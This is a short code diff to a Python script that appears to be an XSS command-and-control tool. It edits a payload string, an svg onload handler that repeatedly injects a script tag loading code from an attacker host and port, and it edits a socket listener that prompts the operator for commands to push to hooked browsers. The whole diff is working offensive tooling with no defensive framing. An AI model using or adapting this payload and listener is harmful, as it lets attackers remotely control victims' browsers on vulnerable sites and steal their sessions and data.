@@ -47,7 +47,7 @@ except:
 gene = args.gene
 cmd = format(args.command)
 secs = int(format(args.secs))
-payload = '%s<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},1166)>\n' % (blue, host, port)
+payload = '%s<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},999)>\n' % (blue, host, port)
 
 
 print(banner)
@@ -68,11 +68,11 @@ Connection: close
         s.bind(('0.0.0.0', port))
         if secs != 0:
             s.settimeout(secs)
+        buffer = input('%s$ %s' % (blue, white))
         s.listen(0)
         try:
             c, a = s.accept()
             data = c.recv(1024)
-            buffer = input('%s$ %s' % (blue, white))
             if buffer == 'exit' or buffer == 'quit':
                 c.close()
                 break
